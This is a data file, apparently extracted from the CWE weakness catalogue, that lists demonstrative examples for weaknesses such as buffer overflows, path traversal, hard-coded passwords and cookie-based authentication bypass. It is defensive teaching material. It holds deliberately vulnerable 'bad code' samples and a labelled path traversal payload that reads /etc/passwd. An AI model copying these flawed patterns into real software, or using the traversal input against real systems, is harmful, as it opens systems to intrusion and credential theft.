        "demonstrative_examples": "Example 1 This example takes an IP address from a user, verifies that it is well formed and then looks up the hostname and copies it into a buffer. (bad code) Example Language: C void host_lookup(char *user_supplied_addr){ struct hostent *hp; in_addr_t *addr; char hostname[64]; in_addr_t inet_addr(const char *cp); /*routine that ensures user_supplied_addr is in the right format for conversion */ validate_addr_form(user_supplied_addr); addr = inet_addr(user_supplied_addr); hp = gethostbyaddr( addr, sizeof(struct in_addr), AF_INET); strcpy(hostname, hp->h_name); } This function allocates a buffer of 64 bytes to store the hostname, however there is no guarantee that the hostname will not be larger than 64 bytes. If an attacker specifies an address which resolves to a very large hostname, then we may overwrite sensitive data or even relinquish control flow to the attacker. Note that this example also contains an unchecked return value ( CWE-252 ) that can lead to a NULL pointer dereference ( CWE-476 ). Example 2 In the following example, it is possible to request that memcpy move a much larger segment of memory than assumed: (bad code) Example Language: C int returnChunkSize(void *) { /* if chunk info is valid, return the size of usable memory, * else, return -1 to indicate an error */ ... } int main() { ... memcpy(destBuf, srcBuf, (returnChunkSize(destBuf)-1)); ... } If returnChunkSize() happens to encounter an error it will return -1. Notice that the return value is not checked before the memcpy operation ( CWE-252 ), so -1 can be passed as the size argument to memcpy() ( CWE-805 ). Because memcpy() assumes that the value is unsigned, it will be interpreted as MAXINT-1 ( CWE-195 ), and therefore will copy far more memory than is likely available to the destination buffer ( CWE-787 , CWE-788 ). Example 3 This example applies an encoding procedure to an input string and stores it into a buffer. (bad code) Example Language: C char * copy_input(char *user_supplied_string){ int i, dst_index; char *dst_buf = (char*)malloc(4*sizeof(char) * MAX_SIZE); if ( MAX_SIZE <= strlen(user_supplied_string) ){ die(\"user string too long, die evil hacker!\"); } dst_index = 0; for ( i = 0; i < strlen(user_supplied_string); i++ ){ \"if( '&' == user_supplied_string[i] ){\" \"dst_buf[dst_index++] = '&';\" \"dst_buf[dst_index++] = 'a';\" \"dst_buf[dst_index++] = 'm';\" \"dst_buf[dst_index++] = 'p';\" \"dst_buf[dst_index++] = ';';\" } \"else if ('<' == user_supplied_string[i] ){\" /* encode to &lt; */ } else dst_buf[dst_index++] = user_supplied_string[i]; } return dst_buf; } The programmer attempts to encode the ampersand character in the user-controlled string, however the length of the string is validated before the encoding procedure is applied. Furthermore, the programmer assumes encoding expansion will only expand a given character by a factor of 4, while the encoding of the ampersand expands by 5. As a result, when the encoding procedure expands the string it is possible to overflow the destination buffer if the attacker provides a string of many ampersands. Example 4 In the following C/C++ example the method processMessageFromSocket() will get a message from a socket, placed into a buffer, and will parse the contents of the buffer into a structure that contains the message length and the message body. A for loop is used to copy the message body into a local character string which will be passed to another method for processing. (bad code) Example Language: C int processMessageFromSocket(int socket) { int success; char buffer[BUFFER_SIZE]; char message[MESSAGE_SIZE]; // get message from socket and store into buffer //Ignoring possibliity that buffer > BUFFER_SIZE if (getMessage(socket, buffer, BUFFER_SIZE) > 0) { // place contents of the buffer into message structure ExMessage *msg = recastBuffer(buffer); // copy message body into string for processing int index; for (index = 0; index < msg->msgLength; index++) { message[index] = msg->msgBody[index]; } \"message[index] = '\\\\0';\" // process message success = processMessage(message); } return success; } However, the message length variable from the structure is used as the condition for ending the for loop without validating that the message length variable accurately reflects the length of the message body ( CWE-606 ). This can result in a buffer over-read ( CWE-125 ) by reading from memory beyond the bounds of the buffer if the message length variable indicates a length that is longer than the size of a message body ( CWE-130 )."
    },
    {
        "id": 789,
        "demonstrative_examples": "Example 1 Consider the following code, which accepts an untrusted size value and allocates a buffer to contain a string of the given size. (bad code) Example Language: C unsigned int size = GetUntrustedInt(); /* ignore integer overflow ( CWE-190 ) for this example */ unsigned int totBytes = size * sizeof(char); char *string = (char *)malloc(totBytes); InitializeString(string); Suppose an attacker provides a size value of: 12345678 This will cause 305,419,896 bytes (over 291 megabytes) to be allocated for the string. Example 2 Consider the following code, which accepts an untrusted size value and uses the size as an initial capacity for a HashMap. (bad code) Example Language: Java unsigned int size = GetUntrustedInt(); HashMap list = new HashMap(size); The HashMap constructor will verify that the initial capacity is not negative, however there is no check in place to verify that sufficient memory is present. If the attacker provides a large enough value, the application will run into an OutOfMemoryError. Example 3 This code performs a stack allocation based on a length calculation. (bad code) Example Language: C int a = 5, b = 6; size_t len = a - b; char buf[len];    // Just blows up the stack } Since a and b are declared as signed ints, the \"a - b\" subtraction gives a negative result (-1). However, since len is declared to be unsigned, len is cast to an extremely large positive number (on 32-bit systems - 4294967295). As a result, the buffer buf[len] declaration uses an extremely large size to allocate on the stack, very likely more than the entire computer\\'s memory space. \"Miscalculations usually will not be so obvious. The calculation will either be complicated or the result of an attacker's input to attain the negative value.\" Example 4 \"This example shows a typical attempt to parse a string with an error resulting from a difference in assumptions between the caller to a function and the function's action.\" (bad code) Example Language: C int proc_msg(char *s, int msg_len) { // Note space at the end of the string - assume all strings have preamble with space int pre_len = sizeof(\"preamble: \"); char buf[pre_len - msg_len]; ... Do processing here if we get this far } char *s = \"preamble: message\\\\n\"; \"char *sl = strchr(s, ':');        // Number of characters up to ':' (not including space)\" int jnklen = sl == NULL ? 0 : sl - s;    // If undefined pointer, use zero length int ret_val = proc_msg (\"s\",  jnklen);    // Violate assumption of preamble length, end up with negative value, blow out stack \"The buffer length ends up being -1, resulting in a blown out stack. The space character after the colon is included in the function calculation, but not in the caller's calculation. This, unfortunately, is not usually so obvious but exists in an obtuse series of calculations.\" Example 5 The following code obtains an untrusted number that is used as an index into an array of messages. (bad code) Example Language: Perl my $num = GetUntrustedNumber(); my @messages = (); $messages[$num] = \"Hello World\"; The index is not validated at all ( CWE-129 ), so it might be possible for an attacker to modify an element in @messages that was not intended. If an index is used that is larger than the current size of the array, the Perl interpreter automatically expands the array so that the large index works. If $num is a large value such as 2147483648 (1<<31), then the assignment to $messages[$num] would attempt to create a very large array, then eventually produce an error message such as: Out of memory during array extend This memory exhaustion will cause the Perl program to exit, possibly a denial of service. In addition, the lack of memory could also prevent many other programs from successfully running on the system. Example 6 \"This example shows a typical attempt to parse a string with an error resulting from a difference in assumptions between the caller to a function and the function's action. The buffer length ends up being -1 resulting in a blown out stack. The space character after the colon is included  in the function calculation, but not in the caller's calculation. This, unfortunately, is not usually so obvious but exists in an obtuse series of calculations.\" (bad code) Example Language: C int proc_msg(char *s, int msg_len) { int pre_len = sizeof(\"preamble: \");    // Note space at the end of the string - assume all strings have preamble with space char buf[pre_len - msg_len]; ... Do processing here and set status return status; } char *s = \"preamble: message\\\\n\"; \"char *sl = strchr(s, ':');        // Number of characters up to ':' (not including space)\" int jnklen = sl == NULL ? 0 : sl - s;    // If undefined pointer, use zero length int ret_val = proc_msg (\"s\",  jnklen);    // Violate assumption of preamble length, end up with negative value, blow out stack (good code) Example Language: C int proc_msg(char *s, int msg_len) { int pre_len = sizeof(\"preamble: \");    // Note space at the end of the string - assume all strings have preamble with space if (pre_len <= msg_len) { // Log error; return error_code; } char buf[pre_len - msg_len]; ... Do processing here and set status return status; } char *s = \"preamble: message\\\\n\"; \"char *sl = strchr(s, ':');        // Number of characters up to ':' (not including space)\" int jnklen = sl == NULL ? 0 : sl - s;    // If undefined pointer, use zero length int ret_val = proc_msg (\"s\",  jnklen);    // Violate assumption of preamble length, end up with negative value, blow out stack"
    },
    {
        "id": 790,
        "demonstrative_examples": "Example 1 The following code takes untrusted input and uses a regular expression to filter \"../\" from the input. It then appends this result to the /home/user/ directory and attempts to read the file in the final resulting path. (bad code) Example Language: Perl my $Username = GetUntrustedInput(); $Username =~ s/\\\\.\\\\.\\\\///; my $filename = \"/home/user/\" . $Username; ReadAndSendFile($filename); Since the regular expression does not have the /g global match modifier, it only removes the first instance of \"../\" it comes across. So an input value such as: (attack code) ../../../etc/passwd will have the first \"../\" stripped, resulting in: (result) ../../etc/passwd This value is then concatenated with the /home/user/ directory: (result) /home/user/../../etc/passwd which causes the /etc/passwd file to be retrieved once the operating system has resolved the ../ sequences in the pathname. This leads to relative path traversal ( CWE-23 )."
    },
    {
        "id": 791,
        "demonstrative_examples": "Example 1 The following code takes untrusted input and uses a regular expression to filter \"../\" from the input. It then appends this result to the /home/user/ directory and attempts to read the file in the final resulting path. (bad code) Example Language: Perl my $Username = GetUntrustedInput(); $Username =~ s/\\\\.\\\\.\\\\///; my $filename = \"/home/user/\" . $Username; ReadAndSendFile($filename); Since the regular expression does not have the /g global match modifier, it only removes the first instance of \"../\" it comes across. So an input value such as: (attack code) ../../../etc/passwd will have the first \"../\" stripped, resulting in: (result) ../../etc/passwd This value is then concatenated with the /home/user/ directory: (result) /home/user/../../etc/passwd which causes the /etc/passwd file to be retrieved once the operating system has resolved the ../ sequences in the pathname. This leads to relative path traversal ( CWE-23 )."
    },
    {
        "id": 792,
        "demonstrative_examples": "Example 1 The following code takes untrusted input and uses a regular expression to filter \"../\" from the input. It then appends this result to the /home/user/ directory and attempts to read the file in the final resulting path. (bad code) Example Language: Perl my $Username = GetUntrustedInput(); $Username =~ s/\\\\.\\\\.\\\\///; my $filename = \"/home/user/\" . $Username; ReadAndSendFile($filename); Since the regular expression does not have the /g global match modifier, it only removes the first instance of \"../\" it comes across. So an input value such as: (attack code) ../../../etc/passwd will have the first \"../\" stripped, resulting in: (result) ../../etc/passwd This value is then concatenated with the /home/user/ directory: (result) /home/user/../../etc/passwd which causes the /etc/passwd file to be retrieved once the operating system has resolved the ../ sequences in the pathname. This leads to relative path traversal ( CWE-23 )."
    },
    {
        "id": 793,
        "demonstrative_examples": "Example 1 The following code takes untrusted input and uses a regular expression to filter \"../\" from the input. It then appends this result to the /home/user/ directory and attempts to read the file in the final resulting path. (bad code) Example Language: Perl my $Username = GetUntrustedInput(); $Username =~ s/\\\\.\\\\.\\\\///; my $filename = \"/home/user/\" . $Username; ReadAndSendFile($filename); Since the regular expression does not have the /g global match modifier, it only removes the first instance of \"../\" it comes across. So an input value such as: (attack code) ../../../etc/passwd will have the first \"../\" stripped, resulting in: (result) ../../etc/passwd This value is then concatenated with the /home/user/ directory: (result) /home/user/../../etc/passwd which causes the /etc/passwd file to be retrieved once the operating system has resolved the ../ sequences in the pathname. This leads to relative path traversal ( CWE-23 )."
    },
    {
        "id": 794,
        "demonstrative_examples": "Example 1 The following code takes untrusted input and uses a regular expression to filter \"../\" from the input. It then appends this result to the /home/user/ directory and attempts to read the file in the final resulting path. (bad code) Example Language: Perl my $Username = GetUntrustedInput(); $Username =~ s/\\\\.\\\\.\\\\///; my $filename = \"/home/user/\" . $Username; ReadAndSendFile($filename); Since the regular expression does not have the /g global match modifier, it only removes the first instance of \"../\" it comes across. So an input value such as: (attack code) ../../../etc/passwd will have the first \"../\" stripped, resulting in: (result) ../../etc/passwd This value is then concatenated with the /home/user/ directory: (result) /home/user/../../etc/passwd which causes the /etc/passwd file to be retrieved once the operating system has resolved the ../ sequences in the pathname. This leads to relative path traversal ( CWE-23 )."
    },
    {
        "id": 795,
        "demonstrative_examples": "Example 1 The following code takes untrusted input and uses a regular expression to filter a \"../\" element located at the beginning of the input string. It then appends this result to the /home/user/ directory and attempts to read the file in the final resulting path. (bad code) Example Language: Perl my $Username = GetUntrustedInput(); $Username =~ s/^\\\\.\\\\.\\\\///; my $filename = \"/home/user/\" . $Username; ReadAndSendFile($filename); Since the regular expression is only looking for an instance of \"../\" at the beginning of the string, it only removes the first \"../\" element. So an input value such as: (attack code) ../../../etc/passwd will have the first \"../\" stripped, resulting in: (result) ../../etc/passwd This value is then concatenated with the /home/user/ directory: (result) /home/user/../../etc/passwd which causes the /etc/passwd file to be retrieved once the operating system has resolved the ../ sequences in the pathname. This leads to relative path traversal ( CWE-22 ). Example 2 The following code takes untrusted input and uses a substring function to filter a 3-character \"../\" element located at the 0-index position of the input string. It then appends this result to the /home/user/ directory and attempts to read the file in the final resulting path. (bad code) Example Language: Perl my $Username = GetUntrustedInput(); \"if (substr($Username, 0, 3) eq '../') {\" $Username = substr($Username, 3); } my $filename = \"/home/user/\" . $Username; ReadAndSendFile($filename); Since the if function is only looking for a substring of \"../\" between the 0 and 2 position, it only removes that specific \"../\" element. So an input value such as: (attack code) ../../../etc/passwd will have the first \"../\" filtered, resulting in: (result) ../../etc/passwd This value is then concatenated with the /home/user/ directory: (result) /home/user/../../etc/passwd which causes the /etc/passwd file to be retrieved once the operating system has resolved the ../ sequences in the pathname. This leads to relative path traversal ( CWE-22 )."
    },
    {
        "id": 796,
        "demonstrative_examples": "Example 1 The following code takes untrusted input and uses a regular expression to filter a \"../\" element located at the beginning of the input string. It then appends this result to the /home/user/ directory and attempts to read the file in the final resulting path. (bad code) Example Language: Perl my $Username = GetUntrustedInput(); $Username =~ s/^\\\\.\\\\.\\\\///; my $filename = \"/home/user/\" . $Username; ReadAndSendFile($filename); Since the regular expression is only looking for an instance of \"../\" at the beginning of the string, it only removes the first \"../\" element. So an input value such as: (attack code) ../../../etc/passwd will have the first \"../\" stripped, resulting in: (result) ../../etc/passwd This value is then concatenated with the /home/user/ directory: (result) /home/user/../../etc/passwd which causes the /etc/passwd file to be retrieved once the operating system has resolved the ../ sequences in the pathname. This leads to relative path traversal ( CWE-22 )."
    },
    {
        "id": 797,
        "demonstrative_examples": "Example 1 The following code takes untrusted input and uses a substring function to filter a 3-character \"../\" element located at the 0-index position of the input string. It then appends this result to the /home/user/ directory and attempts to read the file in the final resulting path. (bad code) Example Language: Perl my $Username = GetUntrustedInput(); \"if (substr($Username, 0, 3) eq '../') {\" $Username = substr($Username, 3); } my $filename = \"/home/user/\" . $Username; ReadAndSendFile($filename); Since the if function is only looking for a substring of \"../\" between the 0 and 2 position, it only removes that specific \"../\" element. So an input value such as: (attack code) ../../../etc/passwd will have the first \"../\" filtered, resulting in: (result) ../../etc/passwd This value is then concatenated with the /home/user/ directory: (result) /home/user/../../etc/passwd which causes the /etc/passwd file to be retrieved once the operating system has resolved the ../ sequences in the pathname. This leads to relative path traversal ( CWE-22 )."
    },
    {
        "id": 798,
        "demonstrative_examples": "Example 1 The following code uses a hard-coded password to connect to a database: (bad code) Example Language: Java ... DriverManager.getConnection(url, \"scott\", \"tiger\"); ... This is an example of an external hard-coded password on the client-side of a connection. This code will run successfully, but anyone who has access to it will have access to the password. Once the program has shipped, there is no going back from the database user \"scott\" with a password of \"tiger\" unless the program is patched. A devious employee with access to this information can use it to break into the system. Even worse, if attackers have access to the bytecode for application, they can use the javap -c command to access the disassembled code, which will contain the values of the passwords used. The result of this operation might look something like the following for the example above: (attack code) javap -c ConnMngr.class 22: ldc #36; //String jdbc:mysql://ixne.com/rxsql 24: ldc #38; //String scott 26: ldc #17; //String tiger Example 2 The following code is an example of an internal hard-coded password in the back-end: (bad code) Example Language: C int VerifyAdmin(char *password) { if (strcmp(password, \"Mew!\")) { printf(\"Incorrect Password!\\\\n\"); return(0) } printf(\"Entering Diagnostic Mode...\\\\n\"); return(1); } (bad code) Example Language: Java int VerifyAdmin(String password) { if (!password.equals(\"Mew!\")) { return(0) } //Diagnostic Mode return(1); } Every instance of this program can be placed into diagnostic mode with the same password. Even worse is the fact that if this program is distributed as a binary-only distribution, it is very difficult to change that password or disable this \"functionality.\" Example 3 The following code examples attempt to verify a password using a hard-coded cryptographic key. (bad code) Example Language: C int VerifyAdmin(char *password) { if (strcmp(password,\"68af404b513073584c4b6f22b6c63e6b\")) { printf(\"Incorrect Password!\\\\n\"); return(0); } printf(\"Entering Diagnostic Mode...\\\\n\"); return(1); } (bad code) Example Language: Java public boolean VerifyAdmin(String password) { if (password.equals(\"68af404b513073584c4b6f22b6c63e6b\")) { System.out.println(\"Entering Diagnostic Mode...\"); return true; } System.out.println(\"Incorrect Password!\"); return false; (bad code) Example Language: C# int VerifyAdmin(String password) { if (password.Equals(\"68af404b513073584c4b6f22b6c63e6b\")) { Console.WriteLine(\"Entering Diagnostic Mode...\"); return(1); } Console.WriteLine(\"Incorrect Password!\"); return(0); } The cryptographic key is within a hard-coded string value that is compared to the password. It is likely that an attacker will be able to read the key and compromise the system. Example 4 The following examples show a portion of properties and configuration files for Java and ASP.NET applications. The files include username and password information but they are stored in cleartext. This Java example shows a properties file with a cleartext username / password pair. (bad code) Example Language: Java # Java Web App ResourceBundle properties file ... webapp.ldap.username=secretUsername webapp.ldap.password=secretPassword ... The following example shows a portion of a configuration file for an ASP.Net application. This configuration file includes username and password information for a connection to a database but the pair is stored in cleartext. (bad code) Example Language: ASP.NET ... <connectionStrings> <add name=\"ud_DEV\" connectionString=\"connectDB=uDB; uid=db2admin; pwd=password; dbalias=uDB;\" providerName=\"System.Data.Odbc\" /> </connectionStrings> ... Username and password information should not be included in a configuration file or a properties file in cleartext as this will allow anyone who can read the file access to the resource. If possible, encrypt this information."
    },
    {
        "id": 799,
        "demonstrative_examples": "Example 1 In the following code a username and password is read from a socket and an attempt is made to authenticate the username and password. The code will continuously checked the socket for a username and password until it has been authenticated. (bad code) Example Language: C char username[USERNAME_SIZE]; char password[PASSWORD_SIZE]; while (isValidUser == 0) { if (getNextMessage(socket, username, USERNAME_SIZE) > 0) { if (getNextMessage(socket, password, PASSWORD_SIZE) > 0) { isValidUser = AuthenticateUser(username, password); } } } return(SUCCESS); This code does not place any restriction on the number of authentication attempts made. There should be a limit on the number of authentication attempts made to prevent brute force attacks as in the following example code. (good code) Example Language: C int count = 0; while ((isValidUser == 0) && (count < MAX_ATTEMPTS)) { if (getNextMessage(socket, username, USERNAME_SIZE) > 0) { if (getNextMessage(socket, password, PASSWORD_SIZE) > 0) { isValidUser = AuthenticateUser(username, password); } } count++; } if (isValidUser) { return(SUCCESS); } else { return(FAIL); }"
    },
    {
        "id": 804,
        "demonstrative_examples": ""
    },
    {
        "id": 805,
        "demonstrative_examples": "Example 1 This example takes an IP address from a user, verifies that it is well formed and then looks up the hostname and copies it into a buffer. (bad code) Example Language: C void host_lookup(char *user_supplied_addr){ struct hostent *hp; in_addr_t *addr; char hostname[64]; in_addr_t inet_addr(const char *cp); /*routine that ensures user_supplied_addr is in the right format for conversion */ validate_addr_form(user_supplied_addr); addr = inet_addr(user_supplied_addr); hp = gethostbyaddr( addr, sizeof(struct in_addr), AF_INET); strcpy(hostname, hp->h_name); } This function allocates a buffer of 64 bytes to store the hostname under the assumption that the maximum length value of hostname is 64 bytes, however there is no guarantee that the hostname will not be larger than 64 bytes. If an attacker specifies an address which resolves to a very large hostname, then we may overwrite sensitive data or even relinquish control flow to the attacker. Note that this example also contains an unchecked return value ( CWE-252 ) that can lead to a NULL pointer dereference ( CWE-476 ). Example 2 In the following example, it is possible to request that memcpy move a much larger segment of memory than assumed: (bad code) Example Language: C int returnChunkSize(void *) { /* if chunk info is valid, return the size of usable memory, * else, return -1 to indicate an error */ ... } int main() { ... memcpy(destBuf, srcBuf, (returnChunkSize(destBuf)-1)); ... } If returnChunkSize() happens to encounter an error it will return -1. Notice that the return value is not checked before the memcpy operation ( CWE-252 ), so -1 can be passed as the size argument to memcpy() ( CWE-805 ). Because memcpy() assumes that the value is unsigned, it will be interpreted as MAXINT-1 ( CWE-195 ), and therefore will copy far more memory than is likely available to the destination buffer ( CWE-787 , CWE-788 ). Example 3 In the following example, the source character string is copied to the dest character string using the method strncpy. (bad code) Example Language: C ... char source[21] = \"the character string\"; char dest[12]; strncpy(dest, source, sizeof(source)-1); ... However, in the call to strncpy the source character string is used within the sizeof call to determine the number of characters to copy. This will create a buffer overflow as the size of the source character string is greater than the dest character string. The dest character string should be used within the sizeof call to ensure that the correct number of characters are copied, as shown below. (good code) Example Language: C ... char source[21] = \"the character string\"; char dest[12]; strncpy(dest, source, sizeof(dest)-1); ... Example 4 In this example, the method outputFilenameToLog outputs a filename to a log file. The method arguments include a pointer to a character string containing the file name and an integer for the number of characters in the string. The filename is copied to a buffer where the buffer size is set to a maximum size for inputs to the log file. The method then calls another method to save the contents of the buffer to the log file. (bad code) Example Language: C #define LOG_INPUT_SIZE 40 // saves the file name to a log file int outputFilenameToLog(char *filename, int length) { int success; // buffer with size set to maximum size for input to log file char buf[LOG_INPUT_SIZE]; // copy filename to buffer strncpy(buf, filename, length); // save to log file success = saveToLogFile(buf); return success; } However, in this case the string copy method, strncpy, mistakenly uses the length method argument to determine the number of characters to copy rather than using the size of the local character string, buf. This can lead to a buffer overflow if the number of characters contained in character string pointed to by filename is larger then the number of characters allowed for the local character string. The string copy method should use the buf character string within a sizeof call to ensure that only characters up to the size of the buf array are copied to avoid a buffer overflow, as shown below. (good code) Example Language: C ... // copy filename to buffer strncpy(buf, filename, sizeof(buf)-1); ..."
    },
    {
        "id": 806,
        "demonstrative_examples": "Example 1 In the following example, the source character string is copied to the dest character string using the method strncpy. (bad code) Example Language: C ... char source[21] = \"the character string\"; char dest[12]; strncpy(dest, source, sizeof(source)-1); ... However, in the call to strncpy the source character string is used within the sizeof call to determine the number of characters to copy. This will create a buffer overflow as the size of the source character string is greater than the dest character string. The dest character string should be used within the sizeof call to ensure that the correct number of characters are copied, as shown below. (good code) Example Language: C ... char source[21] = \"the character string\"; char dest[12]; strncpy(dest, source, sizeof(dest)-1); ... Example 2 In this example, the method outputFilenameToLog outputs a filename to a log file. The method arguments include a pointer to a character string containing the file name and an integer for the number of characters in the string. The filename is copied to a buffer where the buffer size is set to a maximum size for inputs to the log file. The method then calls another method to save the contents of the buffer to the log file. (bad code) Example Language: C #define LOG_INPUT_SIZE 40 // saves the file name to a log file int outputFilenameToLog(char *filename, int length) { int success; // buffer with size set to maximum size for input to log file char buf[LOG_INPUT_SIZE]; // copy filename to buffer strncpy(buf, filename, length); // save to log file success = saveToLogFile(buf); return success; } However, in this case the string copy method, strncpy, mistakenly uses the length method argument to determine the number of characters to copy rather than using the size of the local character string, buf. This can lead to a buffer overflow if the number of characters contained in character string pointed to by filename is larger then the number of characters allowed for the local character string. The string copy method should use the buf character string within a sizeof call to ensure that only characters up to the size of the buf array are copied to avoid a buffer overflow, as shown below. (good code) Example Language: C ... // copy filename to buffer strncpy(buf, filename, sizeof(buf)-1); ..."
    },
    {
        "id": 807,
        "demonstrative_examples": "Example 1 The following code excerpt reads a value from a browser cookie to determine the role of the user. (bad code) Example Language: Java Cookie[] cookies = request.getCookies(); for (int i =0; i< cookies.length; i++) { Cookie c = cookies[i]; if (c.getName().equals(\"role\")) { userRole = c.getValue(); } } Example 2 The following code could be for a medical records application. It performs authentication by checking if a cookie has been set. (bad code) Example Language: PHP \"$auth = $_COOKIES['authenticated'];\" if (! $auth) { if (AuthenticateUser($_POST[\\'user\\'], $_POST[\\'password\\']) == \"success\") { // save the cookie to send out in future responses setcookie(\"authenticated\", \"1\", time()+60*60*2); } else { ShowLoginScreen(); die(\"\\\\n\"); } } \"DisplayMedicalHistory($_POST['patient_ID']);\" The programmer expects that the AuthenticateUser() check will always be applied, and the \"authenticated\" cookie will only be set when authentication succeeds. The programmer even diligently specifies a 2-hour expiration for the cookie. However, the attacker can set the \"authenticated\" cookie to a non-zero value such as 1. As a result, the $auth variable is 1, and the AuthenticateUser() check is not even performed. The attacker has bypassed the authentication. Example 3 In the following example, an authentication flag is read from a browser cookie, thus allowing for external control of user state data. (bad code) Example Language: Java Cookie[] cookies = request.getCookies(); for (int i =0; i< cookies.length; i++) { Cookie c = cookies[i]; if (c.getName().equals(\"authenticated\") && Boolean.TRUE.equals(c.getValue())) { authenticated = true; } } Example 4 The following code samples use a DNS lookup in order to decide whether or not an inbound request is from a trusted host. If an attacker can poison the DNS cache, they can gain trusted status. (bad code) Example Language: C struct hostent *hp;struct in_addr myaddr; char* tHost = \"trustme.example.com\"; myaddr.s_addr=inet_addr(ip_addr_string); hp = gethostbyaddr((char *) &myaddr, sizeof(struct in_addr), AF_INET); if (hp && !strncmp(hp->h_name, tHost, sizeof(tHost))) { trusted = true; } else { trusted = false; } (bad code) Example Language: Java String ip = request.getRemoteAddr(); InetAddress addr = InetAddress.getByName(ip); if (addr.getCanonicalHostName().endsWith(\"trustme.com\")) { trusted = true; } (bad code) Example Language: C# IPAddress hostIPAddress = IPAddress.Parse(RemoteIpAddress); IPHostEntry hostInfo = Dns.GetHostByAddress(hostIPAddress); if (hostInfo.HostName.EndsWith(\"trustme.com\")) { trusted = true; } IP addresses are more reliable than DNS names, but they can also be spoofed. Attackers can easily forge the source IP address of the packets they send, but response packets will return to the forged IP address. To see the response packets, the attacker has to sniff the traffic between the victim machine and the forged IP address. In order to accomplish the required sniffing, attackers typically attempt to locate themselves on the same subnet as the victim machine. Attackers may be able to circumvent this requirement by using source routing, but source routing is disabled across much of the Internet today. In summary, IP address verification can be a useful part of an authentication scheme, but it should not be the single factor required for authentication."
    },
    {
        "id": 820,
        "demonstrative_examples": "Example 1 The following code intends to fork a process, then have both the parent and child processes print a single line. (bad code) Example Language: C static void print (char * string) { char * word; int counter; for (word = string; counter = *word++; ) { putc(counter, stdout); fflush(stdout); /* Make timing window a little larger... */ sleep(1); } } int main(void) { pid_t pid; pid = fork(); if (pid == -1) { exit(-2); } else if (pid == 0) { print(\"child\\\\n\"); } else { print(\"PARENT\\\\n\"); } exit(0); } One might expect the code to print out something like: PARENT child However, because the parent and child are executing concurrently, and stdout is flushed each time a character is printed, the output might be mixed together, such as: PcAhRiElNdT [blank line] [blank line]"
    },
    {
        "id": 821,
        "demonstrative_examples": ""
    },
    {
        "id": 822,
        "demonstrative_examples": ""
    },
    {
        "id": 823,
        "demonstrative_examples": ""
    },
    {
        "id": 824,
        "demonstrative_examples": ""
    },
    {
        "id": 825,
        "demonstrative_examples": "Example 1 The following code shows a simple example of a use after free error: (bad code) Example Language: C char* ptr = (char*)malloc (SIZE); if (err) { abrt = 1; free(ptr); } ... if (abrt) { logError(\"operation aborted before commit\", ptr); } When an error occurs, the pointer is immediately freed. However, this pointer is later incorrectly used in the logError function. Example 2 The following code shows a simple example of a double free error: (bad code) Example Language: C char* ptr = (char*)malloc (SIZE); ... if (abrt) { free(ptr); } ... free(ptr); Double free vulnerabilities have two common (and sometimes overlapping) causes: Error conditions and other exceptional circumstances Confusion over which part of the program is responsible for freeing the memory Although some double free vulnerabilities are not much more complicated than the previous example, most are spread out across hundreds of lines of code or even different files. Programmers seem particularly susceptible to freeing global variables more than once."
    },
    {
        "id": 826,
        "demonstrative_examples": ""
    },
    {
        "id": 827,
        "demonstrative_examples": ""
    },
    {
        "id": 828,
        "demonstrative_examples": "Example 1 This code registers the same signal handler function with two different signals ( CWE-831 ). If those signals are sent to the process, the handler creates a log message (specified in the first argument to the program) and exits. (bad code) Example Language: C char *logMessage; void handler (int sigNum) { syslog(LOG_NOTICE, \"%s\\\\n\", logMessage); free(logMessage); /* artificially increase the size of the timing window to make demonstration of this weakness easier. */ sleep(10); exit(0); } int main (int argc, char* argv[]) { logMessage = strdup(argv[1]); /* Register signal handlers. */ signal(SIGHUP, handler); signal(SIGTERM, handler); /* artificially increase the size of the timing window to make demonstration of this weakness easier. */ sleep(10); } The handler function uses global state (globalVar and logMessage), and it can be called by both the SIGHUP and SIGTERM signals. An attack scenario might follow these lines: The program begins execution, initializes logMessage, and registers the signal handlers for SIGHUP and SIGTERM. The program begins its \"normal\" functionality, which is simplified as sleep(), but could be any functionality that consumes some time. The attacker sends SIGHUP, which invokes handler (call this \"SIGHUP-handler\"). SIGHUP-handler begins to execute, calling syslog(). syslog() calls malloc(), which is non-reentrant. malloc() begins to modify metadata to manage the heap. The attacker then sends SIGTERM. \"SIGHUP-handler is interrupted, but syslog's malloc call is still executing and has not finished modifying its metadata.\" The SIGTERM handler is invoked. SIGTERM-handler records the log message using syslog(), then frees the logMessage variable. At this point, the state of the heap is uncertain, because malloc is still modifying the metadata for the heap; the metadata might be in an inconsistent state. The SIGTERM-handler call to free() is assuming that the metadata is inconsistent, possibly causing it to write data to the wrong location while managing the heap. The result is memory corruption, which could lead to a crash or even code execution, depending on the circumstances under which the code is running. Note that this is an adaptation of a classic example as originally presented by Michal Zalewski [ REF-360 ]; the original example was shown to be exploitable for code execution. Also note that the strdup(argv[1]) call contains a potential buffer over-read ( CWE-126 ) if the program is called without any arguments, because argc would be 0, and argv[1] would point outside the bounds of the array. Example 2 The following code registers a signal handler with multiple signals in order to log when a specific event occurs and to free associated memory before exiting. (bad code) Example Language: C #include <signal.h> #include <syslog.h> #include <string.h> #include <stdlib.h> void *global1, *global2; char *what; void sh (int dummy) { syslog(LOG_NOTICE,\"%s\\\\n\",what); free(global2); free(global1); /* Sleep statements added to expand timing window for race condition */ sleep(10); exit(0); } int main (int argc,char* argv[]) { what=argv[1]; global1=strdup(argv[2]); global2=malloc(340); signal(SIGHUP,sh); signal(SIGTERM,sh); /* Sleep statements added to expand timing window for race condition */ sleep(10); exit(0); } However, the following sequence of events may result in a double-free ( CWE-415 ): a SIGHUP is delivered to the process sh() is invoked to process the SIGHUP This first invocation of sh() reaches the point where global1 is freed At this point, a SIGTERM is sent to the process the second invocation of sh() might do another free of global1 this results in a double-free ( CWE-415 ) This is just one possible exploitation of the above code. As another example, the syslog call may use malloc calls which are not async-signal safe. This could cause corruption of the heap management structures. For more details, consult the example within \"Delivering Signals for Fun and Profit\" [ REF-360 ]."
    },
    {
        "id": 829,
